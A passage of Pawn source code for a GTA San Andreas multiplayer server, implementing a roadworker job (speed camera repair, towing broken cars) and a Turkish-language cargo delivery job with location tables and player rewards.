	    // Check if the player has a wanted level of 4 or higher
		if (APlayerData[playerid][PlayerWanted] >= 4)
			APlayerData[playerid][PlayerWanted] -= 4; // Reduce the wanted level by 4
		else
		APlayerData[playerid][PlayerWanted] = 0; // If the player has a wanted level of less than 4, reset the wanted level to 0
	}

	// Also cleanup the vehicle and trailer id's
	APlayerData[playerid][VehicleID] = 0;
	APlayerData[playerid][TrailerID] = 0;
    // Disable the checkpoint where he must bring his load
	DisablePlayerCheckpoint(playerid);

	return 1;
}

// ************************************************************************************************************************************************************
// PPC_MissionsRoadworker
// ************************************************************************************************************************************************************

// Forward the function used to repair a camera (when the player entered a racecheckpoint)
forward Roadworker_RepairCamera(playerid);



enum TBrokenVehicleLocation
{
	BrokenName[50], // Holds the name of the location where the vehicle is located
	Float:BrokenX, // Holds the X coordinate where the vehicle spawns
	Float:BrokenY, // Holds the Y coordinate where the vehicle spawns
	Float:BrokenZ // Holds the Z coordinate where the vehicle spawns
}
new ABrokenVehicles[][TBrokenVehicleLocation] =
{
//	{"Shady Creeks", -2047.5, -1882.25, 52.4},
	{"Angel Pine", -2072.5, -2407.75, 30.7},
	{"Shady Creeks", -1595.25, -2625.0, 52.6},
	{"Back O Beyond", -990.25, -2335.5, 66.8},
	{"Flint County", 46.5, -2654.25, 40.5},
	{"Los Santos Inlet", -313.5, -1959.75, 20.0},
	{"Leafy Hollow", -833.0, -1737.25, 80.8},
	{"Flint Range", -347.5, -1331.0, 17.1},
	{"Flint County", 17.25, -987.75, 28.7},
	{"Fallen Tree", -763.0, -621.25, 61.5},
	{"Foster Valley", -1885.5, -435.5, 25.2},
	{"Missionary Hill", -2451.25, -681.0, 133.6},
	{"Garcia", -2371.5, 118.25, 35.3},
	{"Downtown", -1781.5, 429.25, 16.6},
	{"Palisades", -2905.0, 656.5, 6.3},
	{"Paradiso", -2771.25, 1239.5, 22.6}
//	{"nnnnnnnnnn", xxxxxxx, yyyyyyyy, zzzzzzz},
};



// This function is called when a roadworker wants to start a job by entering "/work"
Roadworker_StartRandomJob(playerid)
{
	// Setup local variables
	new vid, trailerid;

	// If the player is the driver of the vehicle (GetPlayerVehicleSeat returns -1 if the player is not in a vehicle)
	if (GetPlayerVehicleSeat(playerid) == 0)
	{
		// Get the vehicle-id
		vid = GetPlayerVehicleID(playerid);
		// Get the trailer-id
		trailerid = GetVehicleTrailer(vid);

		switch (GetVehicleModel(vid))
		{
		    case VehicleUtilityVan: // With a Utility Van, you're gonna do "repair speedcamera" job-type
		    {
			    // Check if the player has a utility trailer attached
			    if (trailerid != 0)
				{
					// Check if there is a utility trailer attached
			        if (GetVehicleModel(trailerid) == VehicleUtilityTrailer)
					{
					    // Setup local variables
						new Float:x, Float:y, Float:z, CamID;
						// Get a random speedcamera (no previous camera has been fixed yet, so Exception = -1 (invalid camera))
						CamID = GetRandomCamera(-1);
						// Check if there are no speedcamera's
						if (CamID == -1)
						{
							SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Yakýnlarda Radar Yok , Baska Bolgeyi Deneyin.");
							return 1;
						}

						// Job has started
						APlayerData[playerid][JobStarted] = true;
						// Set job-type
						APlayerData[playerid][JobID] = 1; // Job-type: "repair speedcameras"
						// Store the CamID
						APlayerData[playerid][JobLoc1] = CamID;
						// Set the TextDraw so the player can see it
						//TextDrawSetString(APlayerData[playerid][MissionText], TXT_RepairSpeedcamera);

						// Grab the x, y, z positions for the checkpoint
						x = ACameras[CamID][CamX];
						y = ACameras[CamID][CamY];
						z = ACameras[CamID][CamZ];
						// Create a racecheckpoint where the player should repair a speedcamera
	                    SetPlayerRaceCheckpoint(playerid, 1, x, y, z, 0.0, 0.0, 0.0, 2.5);
						// Create a checkpoint to indicate the base
						SetPlayerCheckpoint(playerid, -1870.0, -1710.0, 21.8, 7.0);

						// Store the vehicleID (required to be able to check if the player left his vehicle)
						APlayerData[playerid][VehicleID] = vid;
						APlayerData[playerid][TrailerID] = trailerid;
						// Start a timer that ticks every second to see if the player is still inside his vehicle
						APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;
						// Inform the player what he must do
						SendClientMessage(playerid, 0xFFFFFFFF, "{00FF00}Bozulan Radarlari Tamir et veya Geri dön");
					}
					else
					    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Utility Kamyonu ve Kasasi gerek");
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Utility Kamyonu ve Kasasi gerek");
			}
			case VehicleTowTruck: // With a towtruck, you're gonna do "tow broken vehicle to shredder" job-type
			{
			    // Setup local variables
				new Float:x, Float:y, Float:z;

				// Job has started
				APlayerData[playerid][JobStarted] = true;
				// Set job-type
				APlayerData[playerid][JobID] = 2; // Job-type: "tow broken vehicles to shredder"
				// Choose a random spawn-location for the vehicle
				APlayerData[playerid][JobLoc1] = random(sizeof(ABrokenVehicles));
				// Set the job-step to 1 (going to pickup the broken vehicle)
				APlayerData[playerid][JobStep] = 1;

				// Grab the x, y, z positions for the checkpoint where the vehicle will spawn, once the player comes into range (100m)
				x = ABrokenVehicles[APlayerData[playerid][JobLoc1]][BrokenX];
				y = ABrokenVehicles[APlayerData[playerid][JobLoc1]][BrokenY];
				z = ABrokenVehicles[APlayerData[playerid][JobLoc1]][BrokenZ];
				// Create a checkpoint to indicate the location of the vehicle
				SetPlayerCheckpoint(playerid, x, y, z, 10.0);
				// Also create the vehicle inside the checkpoint and store the vehicle's reference as the LoadID
				APlayerData[playerid][LoadID] = CreateBrokenVehicle(x, y, z);

				// Store the vehicleID (required to be able to check if the player left his vehicle)
				APlayerData[playerid][VehicleID] = vid;
				// Set the job-fail-time for the global vehicle-timer
				APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;
				// Inform the player what he must do
				SendClientMessage(playerid, 0xFFFFFFFF, "{00FF00}Bozuk araçlarý hurdalýða çek");
			}
		}
	}

	return 1;
}

// This function gets executed when the player entered a checkpoint (to tow a broken vehicle to the shredder)
Roadworker_EnterCheckpoint(playerid)
{
	// Check which job-type you're doing
	if (APlayerData[playerid][JobID] == 2) // Job-type: tow broken vehicle to shredder
	{
		// Check if the player is still inside his towtruck
		if (GetPlayerVehicleID(playerid) == APlayerData[playerid][VehicleID])
		{
			// Select action based on JobStep
			switch (APlayerData[playerid][JobStep])
			{
			    case 1: // Going to pickup the broken vehicle
			    {
					// Delete the checkpoint
					DisablePlayerCheckpoint(playerid);
					// Attach the broken vehicle to your towtruck
					AttachTrailerToVehicle(APlayerData[playerid][LoadID], GetPlayerVehicleID(playerid));
					// Create a checkpoint to indicate the location of the shredder
					SetPlayerCheckpoint(playerid, -1868.5, -1684.0, 21.8, 10.0);
					// Set the next jobstep (2 = going to deliver the broken vehicle to the shredder)
					APlayerData[playerid][JobStep] = 2;

					// Update the vehicleID AND the id of the broken vehicle as trailer (required to be able to check if the player left his vehicle)
					APlayerData[playerid][VehicleID] = GetPlayerVehicleID(playerid);
					APlayerData[playerid][TrailerID] = APlayerData[playerid][LoadID];

					// Inform the player what he must do
					SendClientMessage(playerid, 0xFFFFFFFF, "{00FF00}Bozulmuþ aracý haritada iþaretlenen yere götürün.");

					GorevTime[playerid] = 0;
				}
			    case 2: // Going to deliver the broken vehicle to the shredder
			    {
    		    	if(GorevTime[playerid] < 8)
		    		{
		        		new BanMSG[256];
		        		//new TotalBanTime = (1 * 86400) + (0 * 3600) + gettime();
		        		//APlayerData[playerid][BanTime] = TotalBanTime;

						format(BanMSG, 256, "{FF0000}%s{F8F8FF}, sunucudan tekmelendi. [ {FF0000}Teleport Hack {F8F8FF}]", GetName(playerid));
						SendClientMessageToAll(-1, BanMSG);
						SafeKick(playerid);
		        		return 1;
		    		}

			        // Delete the broken vehicle
			        AVehicleData[APlayerData[playerid][LoadID]][Owned] = false;
			        DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
			        DestroyVehicle(APlayerData[playerid][LoadID]);
			        APlayerData[playerid][LoadID] = 0;

					// End the mission, clearing all data
					Roadworker_EndJob(playerid);
					// Pay the player for delivering the broken vehicle to the shredder
					if(VIP[playerid] >= 1 || YVIP[playerid] == 1)
					{
						RewardPlayer(playerid, 15000, 3);
						EXP[playerid] = EXP[playerid] + 2;
					}else{
						RewardPlayer(playerid, 5000, 1);
					}
					// Let the player know he earned money for delivering the broken vehicle to the shredder
					SendClientMessage(playerid, 0xFFFFFFFF, "{00FF00}Bozulmus Arac Cektiginiz Ýcin {FFFF00}$5000{00FF00} ve {FFFF00}5 EXP{00FF00} Kazandiniz ( VIP iseniz x3 para +2 EXP )");
					// Also increase the stats
					APlayerData[playerid][StatsRoadworkerJobs]++;
					new Message[1024];
					format(Message, 1024, "Yol iþçisi görevini baþarýyla bitirdi");
					SqlLogYaz(playerid, 7, Message);
			
					EXP[playerid] = EXP[playerid] + 5;
					
					// Save the player's account
					Oyuncu_Kaydet(playerid);
			    }
			}
		}
		else
			SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Cekici icinde olmaniz gerekiyor.");
	}

	return 1;
}

// This function gets executed when the player entered a race-checkpoint (to repair a speedcamera)
Roadworker_EnterRaceCheckpoint(playerid)
{
	// Check which job-type you're doing
	if (APlayerData[playerid][JobID] == 1) // Repairing speedcamera's
	{
		// Check if the player is on foot
		if (GetPlayerVehicleSeat(playerid) == -1)
		{
			// Inform the player that he's repairing the camera
	 		GameTextForPlayer(playerid, "Radar Tamir Ediliyor...", 5000, 4);

			// Disable the player's actions (he cannot move anymore)
			TogglePlayerControllable(playerid, 0);
			// Start a timer (Public function "Roadworker_RepairCamera(playerid)" gets called when the timer runs out)
			APlayerData[playerid][LoadingTimer] = SetTimerEx("Roadworker_RepairCamera", 5000, false, "d" , playerid);
		}
		else
		    SendClientMessage(playerid, 0xFFFFFFFF, TXT_NeedOnFootToProceed);
	}

	return 1;
}

// Repair the camera, pay the player and choose a new camera to fix
public Roadworker_RepairCamera(playerid)
{
    // Setup local variables
	new Float:x, Float:y, Float:z, CamID;

	// Pay the player for fixing this camera
	if(VIP[playerid] >= 1 || YVIP[playerid] == 1)
	{
		RewardPlayer(playerid, 7500, 3);
	}else{
		RewardPlayer(playerid, 2500, 1);
	}
	// Let the player know he earned money for fixing this camera
	SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Tamirden Dolayi {FFCC00}$2500{FFFFFF}Kazandiniz ( {FFCC00}VIP iseniz x3 )");
	// Also increase the stats
	APlayerData[playerid][StatsRoadworkerJobs]++;
	// Save the player's account
	Oyuncu_Kaydet(playerid);

	// Get a random speedcamera (don't allow the function to choose the same camera that just has been fixed)
	CamID = GetRandomCamera(APlayerData[playerid][JobLoc1]);
	// Store the CamID
	APlayerData[playerid][JobLoc1] = CamID;

	// Set the mission-TextDraw so the player can see it
	//TextDrawSetString(APlayerData[playerid][MissionText], TXT_RepairSpeedcamera);

	// First delete the racecheckpoint
	DisablePlayerRaceCheckpoint(playerid);
	// Grab the x, y, z positions for the checkpoint
	x = ACameras[CamID][CamX];
	y = ACameras[CamID][CamY];
	z = ACameras[CamID][CamZ];
	// Create a new racecheckpoint where the player should repair a speedcamera
	SetPlayerRaceCheckpoint(playerid, 1, x, y, z, 0.0, 0.0, 0.0, 2.5);

	// Inform the player what he must do
	SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Diger Radari Tamir Edin Veya Geri Donun");
	// Enable the player's actions (he can move again)
	TogglePlayerControllable(playerid, 1);
}



// This function checks if there are camera's defined and returns a random CamID
GetRandomCamera(Exception)
{
	// Setup local variables
	new CameraList[100], CamCount = -1, CamID;

	// Build the list of camera's
	for (CamID = 0; CamID < 100; CamID++)
	{
	    // Check if there is a camera defined at this location
		if (ACameras[CamID][CamSpeed] > 0)
		{
			// Increase the camera-counter to select the next index in the list
			CamCount++;
			// Store the CamID in the list
			CameraList[CamCount] = CamID;
		}
	}

	// If there are no camera's, return -1
	if (CamCount == -1)
	    return -1;

	// Get a random CameraID
	CamID = CameraList[random(CamCount + 1)];

	// Prevent the same camera being chosen as before
	while (CamID == Exception)
		CamID = CameraList[random(CamCount + 1)];

	// Choose a random camera from the list
	return CamID;
}



// This function is used to cleanup the current job
Roadworker_EndJob(playerid)
{
	if (APlayerData[playerid][JobStarted] == true)
	{
		// Clear all data about the job from the player, so he can start a new one
		APlayerData[playerid][JobStarted] = false;
		APlayerData[playerid][JobStep] = 0;
		APlayerData[playerid][JobID] = 0;
		APlayerData[playerid][VehicleTimerTime] = 0;
		APlayerData[playerid][VehicleID] = 0;
		APlayerData[playerid][TrailerID] = 0;
		APlayerData[playerid][JobLoc1] = 0;
		APlayerData[playerid][JobLoc2] = 0;
		// If the player was doing the "tow broken vehicle" job-type, check if there was a vehicle created
		if (APlayerData[playerid][LoadID] != 0)
		{
			DestroyVehicle(APlayerData[playerid][LoadID]); // Destroy the vehicle
			APlayerData[playerid][LoadID] = 0; // Clear the LoadID
		}

		// Delete the checkpoints
		DisablePlayerCheckpoint(playerid);
		DisablePlayerRaceCheckpoint(playerid);
		// Reset the missiontext
		//TextDrawSetString(APlayerData[playerid][MissionText], RoadWorker_NoJobText);
		// Kill the LoadingTimer
		KillTimer(APlayerData[playerid][LoadingTimer]);
	}

	return 1;
}



// This function creates a random vehicle, spawns it and damages it and protects it from the /cleanupcars command, so admins cannot
// bug missions by cleaning up the world from spawned cars
CreateBrokenVehicle(Float:x, Float:y, Float:z)
{
	// Setup local variables
	new vid, panels, doors, lights, tires;
	new paramsengine, paramslights, paramsalarm, paramsdoors, paramsbonnet, paramsboot, paramsobjective;
	new BrokenVids[] = {400, 401, 402, 404, 405, 409, 410, 411, 412, 415, 419, 420, 421, 424, 426, 429, 434, 436, 438, 439, 442, 445, 451, 458, 466, 467, 474, 475, 477, 479, 480, 489, 490, 491, 492, 494, 495, 496, 500, 502, 503, 504, 505, 506, 507, 516, 517, 518, 526, 527, 528, 529, 533, 534, 535, 536, 540, 541, 542, 543, 545, 546, 547, 549, 550, 551, 552, 554, 555, 558, 559, 560, 561, 562, 565, 566, 567, 568, 575, 576, 579, 580, 582, 585, 587, 588, 589, 596, 597, 598, 599, 600, 602, 603};

	// Create the vehicle (choose a random vehicle from the array BrokenVids)
    vid = CreateVehicle(BrokenVids[random(sizeof(BrokenVids))], x, y, z, random(360), random(126), random(126), 3600);
	// Also set the data to prevent /cleanupcars deleting this vehicle
	AVehicleData[vid][Owned] = true;
	// Create an arrow above the vehicle to point to it (objective) and lock the doors so nobody can steal it
	GetVehicleParamsEx(vid, paramsengine, paramslights, paramsalarm, paramsdoors, paramsbonnet, paramsboot, paramsobjective);
	SetVehicleParamsEx(vid, paramsengine, paramslights, paramsalarm, true, paramsbonnet, paramsboot, true);

	// Damage all components of the vehicle
	tires = encode_tires(1, 1, 1, 1); // All tires popped
	panels = encode_panels(3, 3, 3, 3, 3, 3, 3); // All panels broken off
	doors = encode_doors(4, 4, 4, 4, 4, 4); // All doors broken
	lights = encode_lights(1, 1, 1, 1); // All lights damaged
	// Update the damage status of the vehicle
	UpdateVehicleDamageStatus(vid, panels, doors, lights, tires);
	// Set the vehicle damage quite low (this will make the vehicle smoke)
	SetVehicleHealth(vid, 300.0);

	return vid;
}



encode_tires(tire1, tire2, tire3, tire4)
{
	return tire1 | (tire2 << 1) | (tire3 << 2) | (tire4 << 3);
}
encode_panels(flp, frp, rlp, rrp, windshield, front_bumper, rear_bumper)
{
    return flp | (frp << 4) | (rlp << 8) | (rrp << 12) | (windshield << 16) | (front_bumper << 20) | (rear_bumper << 24);
}
encode_doors(bonnet, boot, driver_door, passenger_door, behind_driver_door, behind_passenger_door)
{
    #pragma unused behind_driver_door
    #pragma unused behind_passenger_door
    return bonnet | (boot << 8) | (driver_door << 16) | (passenger_door << 24);
}
encode_lights(light1, light2, light3, light4)
{
    return light1 | (light2 << 1) | (light3 << 2) | (light4 << 3);
}

// ************************************************************************************************************************************************************
// PPC_MissionsKargocu
// ************************************************************************************************************************************************************
new KargoAraba[MAX_PLAYERS],
	KargoOrtak[MAX_PLAYERS],
	KargoBolgesi[MAX_PLAYERS];

new LSKargoBolge[8][LocGroupInfo]={
{"Mulholland", {1, 2, 3, 4, 5}},
{"Richman", {6, 7, 8, 9, 10}},
{"Santa Maria Beach", {11, 12, 13, 14, 15}},
{"Idlewood", {16, 17, 18, 19, 20}},
{"Ganton", {21, 22, 23, 24, 25}},
{"East Los Santos", {26, 27, 28, 29, 30}},
{"Jefferson", {31, 32, 33, 34, 35}},
{"Las Colinas", {36, 37, 38, 39, 40}}
};

new LSKargoYer[41][LocInfo]={
	{"Olmayan Yer", 0.0, 0.0, 0.0},
	{"MulhollandKargo",  925.33, -852.61,   93.45}, // ID = 1
	{"MulhollandKargo", 1034.54, -812.41,  101.85}, // ID = 2
	{"MulhollandKargo", 1497.13, -689.49,   94.95}, // ID = 3
	{"MulhollandKargo", 1526.44, -773.87,   79.90}, // ID = 4
	{"MulhollandKargo", 1468.84, -902.82,   54.83}, // ID = 5
	{"RichmanKargo",  558.49, -1160.59,   54.42}, // ID = 6
	{"RichmanKargo",  471.62, -1166.22,   66.72}, // ID = 7
	{"RichmanKargo",  298.82, -1155.60,   80.90}, // ID = 8
	{"RichmanKargo",  353.95, -1278.17,   53.89}, // ID = 9
	{"RichmanKargo",  256.19, -1365.96,   53.10}, // ID = 10
	{"SantaMariaBeachKargo",  192.92, -1746.35,    4.32}, // ID = 11
	{"SantaMariaBeachKargo",  648.77, -1714.68,   14.29}, // ID = 12
	{"SantaMariaBeachKargo",  692.93, -1598.12,   14.11}, // ID = 13
	{"SantaMariaBeachKargo",  763.78, -1655.90,    4.65}, // ID = 14
	{"SantaMariaBeachKargo",  910.47, -1800.40,   13.69}, // ID = 15
	{"IdlewoodKargo", 2015.45, -1704.12,   13.82}, // ID = 16
	{"IdlewoodKargo", 1975.04, -1672.92,   15.96}, // ID = 17
	{"IdlewoodKargo", 2012.69, -1596.16,   13.57}, // ID = 18
	{"IdlewoodKargo", 2069.96, -1643.62,   13.54}, // ID = 19
	{"IdlewoodKargo", 2157.11, -1706.06,   15.08}, // ID = 20
	{"GantonKargo", 2519.64, -1678.74,   14.79}, // ID = 21
	{"GantonKargo", 2361.92, -1795.65,   13.54}, // ID = 22
	{"GantonKargo", 2385.99, -1714.44,   13.83}, // ID = 23
	{"GantonKargo", 2413.35, -1649.14,   13.54}, // ID = 24
	{"GantonKargo", 2256.85, -1646.78,   15.49}, // ID = 25
	{"EastLosSantosKargo", 2436.87, -1288.91,   24.68}, // ID = 26
	{"EastLosSantosKargo", 2385.10, -1328.85,   24.48}, // ID = 27
	{"EastLosSantosKargo", 2352.10, -1168.47,   27.95}, // ID = 28
	{"EastLosSantosKargo", 2488.31, -1138.36,   38.82}, // ID = 29
	{"EastLosSantosKargo", 2395.73, -1452.89,   24.00}, // ID = 30
	{"JeffersonKargo", 2192.24, -1278.76,   24.59}, // ID = 31
	{"JeffersonKargo", 2130.51, -1363.46,   25.54}, // ID = 32
	{"JeffersonKargo", 2246.91, -1237.48,   25.41}, // ID = 33
	{"JeffersonKargo", 2092.08, -1280.62,   25.77}, // ID = 34
	{"JeffersonKargo", 2192.11, -1470.19,   25.83}, // ID = 35
	{"LasColinasKargo", 2335.10, -1044.52,   52.35}, // ID = 36
	{"LasColinasKargo", 2550.16, -1032.79,   69.57}, // ID = 37
	{"LasColinasKargo", 2472.59, -964.23,   80.13}, // ID = 38
	{"LasColinasKargo", 2220.14, -1030.33,   59.86}, // ID = 39
	{"LasColinasKargo", 2008.17, -985.31,   33.96} // ID = 40
};

new LSKargoMerkez[1][LocInfo]={
	{"LS Kargo Merkez", 1826.27, -1403.07,   13.42} // ID = 0
};

new SFKargoBolge[6][LocGroupInfo]={
{"Ocean Flats", {1, 2, 3, 4, 5}},
{"Palisades", {6, 7, 8, 9, 10}},
{"Paradiso", {11, 12, 13, 14, 15}},
{"Juniper Hill", {16, 17, 18, 19, 20}},
{"Calton Heights", {21, 22, 23, 24, 25}},
{"Hashbury", {26, 27, 28, 29, 30}}
};

new SFKargoYer[31][LocInfo]={
	{"Olmayan Yer", 0.0, 0.0, 0.0},
	{"OceanFlatsKargo", -2797.00, -171.13,    7.18}, // ID = 1
	{"OceanFlatsKargo", -2794.55,  -83.28,    7.18}, // ID = 2
	{"OceanFlatsKargo", -2794.55,  -17.58,    7.18}, // ID = 3
	{"OceanFlatsKargo", -2720.34,   14.61,    4.33}, // ID = 4
	{"OceanFlatsKargo", -2719.77,  -36.82,    4.34}, // ID = 5
	{"PalisadesKargo", -2868.49,  690.77,   23.47}, // ID = 6
	{"PalisadesKargo", -2878.29,  797.16,   35.70}, // ID = 7
	{"PalisadesKargo", -2843.76,  914.63,   44.05}, // ID = 8
	{"PalisadesKargo", -2899.79, 1056.63,   32.13}, // ID = 9
	{"PalisadesKargo", -2904.71, 1164.82,   13.66}, // ID = 10
	{"ParadisoKargo", -2597.89,  979.43,   78.27}, // ID = 11
	{"ParadisoKargo", -2555.66,  898.96,   64.98}, // ID = 12
	{"ParadisoKargo", -2666.62,  909.56,   79.66}, // ID = 13
	{"ParadisoKargo", -2596.17,  831.07,   49.98}, // ID = 14
	{"ParadisoKargo", -2700.16,  819.71,   49.98}, // ID = 15
	{"JuniperHillKargo", -2369.60,  763.45,   35.10}, // ID = 16
	{"JuniperHillKargo", -2303.53,  819.17,   48.64}, // ID = 17
	{"JuniperHillKargo", -2241.69,  753.42,   49.39}, // ID = 18
	{"JuniperHillKargo", -2358.74,  657.50,   35.17}, // ID = 19
	{"JuniperHillKargo", -2243.73,  682.40,   49.44}, // ID = 20
	{"CaltonHeightsKargo", -2075.62,  901.41,   64.13}, // ID = 21
	{"CaltonHeightsKargo", -2127.78,  832.47,   69.56}, // ID = 22
	{"CaltonHeightsKargo", -2066.39,  797.65,   64.91}, // ID = 23
	{"CaltonHeightsKargo", -2017.41,  865.67,   45.44}, // ID = 24
	{"CaltonHeightsKargo", -2101.65,  899.45,   76.71}, // ID = 25
	{"HashburyKargo", -2514.25, -154.19,   25.17}, // ID = 26
	{"HashburyKargo", -2558.40, -199.96,   10.93}, // ID = 27
	{"HashburyKargo", -2591.23, -158.65,    4.30}, // ID = 28
	{"HashburyKargo", -2558.87,  -79.46,   10.82}, // ID = 29
	{"HashburyKargo", -2558.97, -143.79,    9.91} // ID = 30
};

new SFKargoMerkez[1][LocInfo]={
	{"SF Kargo Merkez", -2711.86, -976.49,    9.52}
};

// StartKargocuGorev
StartKargocuGorev(playerid)
{
	if(APlayerData[playerid][PlayerClass] != ClassKargocu) return Hata(playerid, "Bu görevi yapabilmek için kargocu olmanýz gerekiyor!");
	if(MeslekDurum[playerid] != 0) return Hata(playerid, "Þuan kargoculuk görevi yapýyorsunuz!");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return Hata(playerid, "Görev baþlatabilmek için kargo aracýný(Burrito) sürüyor olmanýz gerekiyor!");
	if(GetVehicleModel( GetPlayerVehicleID(playerid) ) != 482) return Hata(playerid, "Kargo aracýnda(Burrito) deðilsiniz!");
	KargoOrtak[playerid] = -1;

	foreach(new o:Player)
	{
	    if(o == playerid) continue;
	    if(APlayerData[o][PlayerClass] != ClassKargocu) continue;
	    if(MeslekDurum[o] != 0) continue;
	    if(!IsPlayerInAnyVehicle(o)) continue;
		if(GetPlayerVehicleID(o) != GetPlayerVehicleID(playerid)) continue;
		KargoOrtak[playerid] = o;
	}

	if(KargoOrtak[playerid] == -1)
	{
    	APlayerData[playerid][JobStarted] = true;

		MeslekDurum[playerid] = 1;

		KargoAraba[playerid] = GetPlayerVehicleID(playerid);

		MeslekSehir[playerid] = GetPlayerSehir(playerid);

		switch(MeslekSehir[playerid])
		{
	    	case SehirLosSantos:
			{
				KargoBolgesi[playerid] = random(sizeof(LSKargoBolge));

				SetPlayerCheckpoint(playerid, LSKargoMerkez[0][LocX], LSKargoMerkez[0][LocY], LSKargoMerkez[0][LocZ], 10.0);
			}
	    	case SehirSanFierro:
			{
				KargoBolgesi[playerid] = random(sizeof(SFKargoBolge));

				SetPlayerCheckpoint(playerid, SFKargoMerkez[0][LocX], SFKargoMerkez[0][LocY], SFKargoMerkez[0][LocZ], 10.0);
			}
		}

		BILGI(playerid, "Kargo daðýtýmýna baþlamadan önce firma merkezine gitmeniz gerekiyor.");
		BILGI(playerid, "Haritada kýrmýzý ile iþaretlenen firma merkezine gidin.");
	}else{
		KargoOrtak[ KargoOrtak[playerid] ] = playerid;

	    APlayerData[playerid][JobStarted] = true;
	    APlayerData[ KargoOrtak[playerid] ][JobStarted] = true;
    
		MeslekDurum[playerid] = 1;
		MeslekDurum[ KargoOrtak[playerid] ] = 1;

		KargoAraba[playerid] = GetPlayerVehicleID(playerid);
		KargoAraba[ KargoOrtak[playerid] ] = GetPlayerVehicleID(playerid);

		MeslekSehir[playerid] = GetPlayerSehir(playerid);
		MeslekSehir[ KargoOrtak[playerid] ] = MeslekSehir[playerid];

		switch(MeslekSehir[playerid])
		{
	    	case SehirLosSantos:
			{
				KargoBolgesi[playerid] = random(sizeof(LSKargoBolge));
				KargoBolgesi[ KargoOrtak[playerid] ] = KargoBolgesi[playerid];

				SetPlayerCheckpoint(playerid, LSKargoMerkez[0][LocX], LSKargoMerkez[0][LocY], LSKargoMerkez[0][LocZ], 10.0);
				SetPlayerCheckpoint(KargoOrtak[playerid], LSKargoMerkez[0][LocX], LSKargoMerkez[0][LocY], LSKargoMerkez[0][LocZ], 10.0);
			}
	    	case SehirSanFierro:
			{
				KargoBolgesi[playerid] = random(sizeof(SFKargoBolge));
				KargoBolgesi[ KargoOrtak[playerid] ] = KargoBolgesi[playerid];

				SetPlayerCheckpoint(playerid, SFKargoMerkez[0][LocX], SFKargoMerkez[0][LocY], SFKargoMerkez[0][LocZ], 10.0);
				SetPlayerCheckpoint(KargoOrtak[playerid], SFKargoMerkez[0][LocX], SFKargoMerkez[0][LocY], SFKargoMerkez[0][LocZ], 10.0);
			}
		}

		BILGI(playerid, "Kargo daðýtýmýna baþlamadan önce firma merkezine gitmeniz gerekiyor.");
		BILGI(playerid, "Ortaðýnýzla beraber haritada kýrmýzý ile iþaretlenen firma merkezine gidin.");

		BILGI(KargoOrtak[playerid], "Kargo daðýtýmýna baþlamadan önce firma merkezine gitmeniz gerekiyor.");
		BILGI(KargoOrtak[playerid], "Ortaðýnýzla beraber haritada kýrmýzý ile iþaretlenen firma merkezine gidin.");
	}

	return 1;
}

// StopKargocuGorev
StopKargocuGorev(playerid)
{
	if(MeslekDurum[playerid] == 0) return Hata(playerid, "Zaten görev baþlatmamýþsýnýz!");
	if(KargoOrtak[playerid] == -1)
	{
		MeslekDurum[playerid] = 0;

	    APlayerData[playerid][JobStarted] = false;

		DisablePlayerCheckpoint(playerid);

		KargoAraba[playerid] = -1;
	}else{
		MeslekDurum[ KargoOrtak[playerid] ] = 0;
		MeslekDurum[playerid] = 0;

	    APlayerData[playerid][JobStarted] = false;
	    APlayerData[ KargoOrtak[playerid] ][JobStarted] = false;
    
		DisablePlayerCheckpoint(playerid);
		DisablePlayerCheckpoint(KargoOrtak[playerid]);

		KargoAraba[playerid] = -1;
		KargoAraba[ KargoOrtak[playerid] ] = -1;

		KargoOrtak[ KargoOrtak[playerid] ] = -1;
		KargoOrtak[playerid] = -1;
	}
	return 1;
}

// ControlKargocuGorev
ControlKargocuGorev(playerid)
{
	if(APlayerData[playerid][PlayerClass] != ClassKargocu) return 1;
	new UI_Yazi[500];

	switch(MeslekDurum[playerid])
	{
	    case 0: // Görev Baþlatýlmadý
	    {
 	    	PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], "Kargocu");

			format(UI_Yazi, 500, "~w~Suan gorev baslatmadiniz~n~~w~Gorev baslatmak icin ~r~Kargo Aracina(Burrito)~n~~w~binip ~g~~h~~h~/work ~w~yazin.");
	    	PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], UI_Yazi);
	    }

	    case 1: // Kargo Yüklüyorlar
	    {
   			PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], "Kargocu");
    		PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], "~w~Kargo aracini yuklemek icin ~y~Firma Merkezi~w~'ne~n~gidiniz.");
	    }

	    case 2,3,4,5,6: // Kargo Daðýtýyorlar
	    {
   			PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], "Kargocu");

			switch(MeslekSehir[playerid])
	        {
	            case SehirLosSantos:
	            {
	                format(UI_Yazi, 500, "~y~%s ~w~bolgesindeki~n~evlere kargo dagitimi yapin. ~p~(%d/5)", LSKargoBolge[ KargoBolgesi[playerid] ][LocGName], MeslekDurum[playerid]-2);
           			PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], UI_Yazi);
	            }

	            case SehirSanFierro:
	            {
	                format(UI_Yazi, 500, "~y~%s ~w~bolgesindeki~n~evlere kargo dagitimi yapin. ~p~(%d/5)", SFKargoBolge[ KargoBolgesi[playerid] ][LocGName], MeslekDurum[playerid]-2);
           			PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], UI_Yazi);
	            }
	        }
	    }

	    case 7: // Merkeze Donuyorlar
	    {
	    	PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], "Kargocu");
	    	PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], "~y~Firma Merkezi~w~ne geri donun ve gorevi bitirin.");
	    }
	}

	return 1;
}

// OnKargocuVehicleDeath
OnKargocuVehicleDeath(vehicleid)
{
	foreach(new playerid : Player)
	{
	    if(APlayerData[playerid][PlayerClass] != ClassKargocu) continue;
	    if(MeslekDurum[playerid] == 0) continue;
	    if(KargoAraba[playerid] == vehicleid)
	    {
